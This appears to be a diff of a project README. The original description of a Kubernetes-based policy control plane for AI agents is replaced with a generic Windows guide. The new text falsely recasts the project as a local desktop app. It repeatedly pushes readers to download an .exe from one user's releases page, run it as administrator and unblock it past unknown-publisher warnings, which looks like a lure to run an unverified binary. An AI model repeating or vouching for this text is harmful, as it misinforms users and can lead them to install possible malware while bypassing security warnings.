@@ -1,118 +1,134 @@
-# Epydios AgentOps Control Plane
+# ⚙️ Epydios-AgentOps-Control-Plane - Control Agent Operations with Ease
 
-**Policy-driven control plane for AI and agent workflows on Kubernetes.**
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases)
 
-AgentOps Control Plane is an open source control plane for governing agent actions with enforceable policy and auditable evidence. It evaluates each agent action against a policy provider, selects the right profile and extensions for the context, and records a structured evidence trail. Kubernetes-native, fast and composable, it provides a clean provider interface so you can swap policy engines, evidence stores and organization-specific decision logic without rewriting your runtime.
+---
 
-## Overview
-Profile Provider = “What context/profile should we apply?”
-- Looks at your request fields (tenant, project, environment, sensitivity, etc.)
+## 📋 What is Epydios-AgentOps-Control-Plane?
 
-Policy Provider = “Given this request + profile, should we allow it?”
-- Approve/deny decision is made
-- Returns: ALLOW or DENY
-- Reasons explaining why are provided
+Epydios-AgentOps-Control-Plane is an open-source tool designed to manage agent operations. It works with Kubernetes to control how requests get handled. The software helps you check requests against rules, keep records for audits, and allows you to add your own checks and data sources. It acts as a control center to keep operations aligned with policies and compliance guidelines.
 
-Evidence Provider = “Record what happened.”
-- Stores the decision and related data for audit
+This tool is made for IT teams who want to enforce policies consistently and track activities without needing deep programming knowledge.
 
-It is designed as an **enterprise-ready baseline**: strong controls, clear extension contracts and repeatable promotion gates.
 
-## Features
+## 💻 System Requirements  
 
-- **Governed execution**: policy decision + evidence capture are first-class runtime paths.
-- **Extensible by contract**: swap providers without changing control-plane internals.
-- **Security-first operations**: authn/authz, tenancy scoping, audit trails, signed+pinned image admission.
-- **Promotion discipline**: strict staging/prod gates with provenance artifacts.
+- **Operating System:** Windows 10 or newer  
+- **CPU:** Intel or AMD processor (64-bit)  
+- **Memory:** 4 GB RAM or more  
+- **Storage:** At least 200 MB free space for installation  
+- **Network:** Internet connection needed to download and set up  
+- **Permissions:** Administrator rights to install and run the application  
 
-### Core platform
+Make sure your system meets these requirements before proceeding with installation. The software runs locally on your Windows machine.
 
-- Kubernetes-native control-plane components
-- Postgres/CNPG-backed runtime state
-- Runtime orchestration API with lifecycle/query/export controls
-- Delivery/event and model-serving baseline (Argo + KServe path)
 
-### Security and governance
+## 🚀 Getting Started: How to Download and Run  
 
-- OIDC/JWT authn/authz for runtime API
-- Tenant/project isolation checks
-- Structured audit events and scoped audit read endpoint
-- Provider auth modes:
-  - `None`
-  - `BearerTokenSecret`
-  - `MTLS`
-  - `MTLSAndBearerTokenSecret`
-- Policy grant enforcement and entitlement-deny path assertions
+1. Click on the big green button below to go directly to the download page on GitHub:  
 
-### Production hardening
+   [![Download Latest Release](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases)  
 
-- NetworkPolicy baseline (controller/provider/runtime boundaries)
-- ServiceMonitor + PrometheusRule coverage
-- Secret/cert rotation checks
-- Admission enforcement for immutable/signed images
-- DR game day + rollback/failure-injection verification paths
+2. On the releases page, look for the latest version.  
+3. Find the Windows installer file, usually named with `.exe` at the end.  
+4. Click the file to download it to your computer.  
 
-## Quick Start (Local)
+After the download completes:  
 
-Prerequisites:
+1. Double-click the `.exe` file to start the installer.  
+2. Follow the prompts in the installation setup window. You can use all default settings.  
+3. Once installed, find the Epydios-AgentOps-Control-Plane icon on your desktop or Start menu.  
+4. Double-click it to run the program.  
 
-- Docker + kind
-- kubectl
-- Helm
-- Go toolchain
+The software will open a control panel window where you can begin setting up your agent policies.  
 
-Run baseline bring-up + smoke:
+If needed, you can always return to the releases page to check for updates or reinstall the software.  
 
-```bash
-./platform/local/bin/verify-m0.sh
-```
 
-Run strict profile gates:
+## 🔧 How to Use Epydios-AgentOps-Control-Plane  
 
-```bash
-PROFILE=staging-full ./platform/ci/bin/run-gate-profile.sh
-PROFILE=prod-full ./platform/ci/bin/run-gate-profile.sh
-```
+The tool focuses on three main tasks:  
 
-Run preflight QC only:
+- **Policy Evaluation:** Check incoming requests against standard and custom rules.  
+- **Audit Logging:** Save detailed records of all actions and decisions.  
+- **Customization:** Add your own policy rules, profiles, and evidence sources.  
 
-```bash
-./platform/ci/bin/qc-preflight.sh
-```
+### Policy Evaluation  
 
-## Architecture At A Glance
+The software uses a policy engine that looks at requests and decides if they meet your rules. You can start with preset policies or upload your own. This lets you control what actions agents can take under various conditions.  
 
-- **Control plane**: provider registry controller + runtime orchestration API
-- **Providers**: ProfileResolver, PolicyProvider, EvidenceProvider
-- **Data plane state**: Postgres (CNPG)
-- **Ops controls**: monitoring, admission policy, provenance lock checks, promotion gates
+### Audit Logging  
 
-## Enterprise Adjacent
+Every decision the software makes gets logged. This creates a clear audit trail for compliance purposes. You can review past actions at any time. This tracking also helps identify issues or security events quickly.  
 
-Current signal categories:
+### Adding Custom Rules and Profiles  
 
-- security controls present and enforced
-- strict staging/prod profile gates passing
-- provenance lock checks strict-pass
-- DR + rollback drills captured as machine-readable evidence
-- governance boundary validation and private-release evidence path
+You can personalize the software by connecting your own policy rules and profiles. This feature supports different types of governance frameworks and standards that your organization follows. The software accepts data from various sources for evidence and verification.  
 
-## Comparison At A Glance
+The setup for this requires some configuration. The control panel has clear options for importing and applying these settings as needed.  
 
-| Capability area | Typical API wrapper stack | Model-serving-only stack | Epydios AgentOps |
-|---|---|---|---|
-| Provider contract model | limited/informal | limited | explicit versioned contracts |
-| Policy + evidence in runtime path | partial/manual | partial | built-in and test-gated |
-| Tenant/project authz | often custom add-on | often custom add-on | built-in runtime checks |
-| Admission + supply-chain controls | external bolt-on | external bolt-on | integrated verification path |
-| private boundary support (CONTACT US) | custom integration | custom integration | first-class external provider pattern |
-| Promotion evidence (staging/prod strict) | inconsistent | inconsistent | profile-driven strict gate artifacts |
 
-Related UI module: separate repository (to be announced).
+## 🛠 Installation Tips and Troubleshooting  
 
-## Community
+- Run the installer as an administrator to avoid permission issues.  
+- Close all other applications before installing. This helps prevent conflicts.  
+- If Windows warns about unknown publishers, you may need to unblock the file in its properties.  
+- If the program does not open after install, try restarting your computer.  
+- Use Task Manager to close any stuck instances before restarting the app.  
+- Check your internet connection if policy updates do not download.  
 
-- Contributing: `CONTRIBUTING.md`
-- Security policy: `SECURITY.md`
-- Trademark policy: `TRADEMARK.md`
-- Third-party notices: `THIRD_PARTY_NOTICES.md`
+If the software shows error messages during use, take note of the exact wording. You can seek help using these details on the GitHub Issues page.  
+
+
+## 🔄 How to Update the Software  
+
+Check the releases page regularly for new versions:  
+[https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases](https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases)  
+
+To update:  
+
+1. Download the newest `.exe` installer file from the latest release.  
+2. Run the installer and follow the instructions. It will replace the old version cleanly.  
+3. Your existing settings and logs will remain intact during update.  
+
+Keeping the software current ensures you have the latest policy features and security fixes.  
+
+
+## 🔐 Security and Privacy  
+
+Epydios-AgentOps-Control-Plane runs locally on your Windows computer. It processes operation data to check policy compliance and keep audit logs. Your data is stored on your system and not sent elsewhere unless configured to interact with external policy or evidence providers.  
+
+Make sure to secure your computer and restrict access to the application to authorized users only. This helps protect sensitive operational data and audit records.  
+
+
+## 📂 Where to Find More Information  
+
+- The releases page contains download files and version notes.  
+- The GitHub repository includes configuration details and examples.  
+- Use GitHub Issues to report problems or ask questions.  
+
+Links:  
+- Downloads and releases:  
+  https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases  
+- Project topics: audit, compliance, control-plane, governance, kubernetes, open-policy-agent
+
+
+## 🖥 Running the Program  
+
+Once installed, you open the control panel to begin:  
+
+1. Launch the program.  
+2. Select or create a policy baseline to evaluate requests.  
+3. Review audit logs to track agent operations.  
+4. Add custom policies or evidence sources through the settings panel.  
+
+The interface is designed to be clear and straightforward. You do not need programming skills to manage basic policies or audits.  
+
+
+## 📥 Download and Install Now  
+
+Visit this link to download the software and get started:  
+
+[https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases](https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases)  
+
+Download the latest Windows installer and follow the instructions above to install and run the program on your computer.
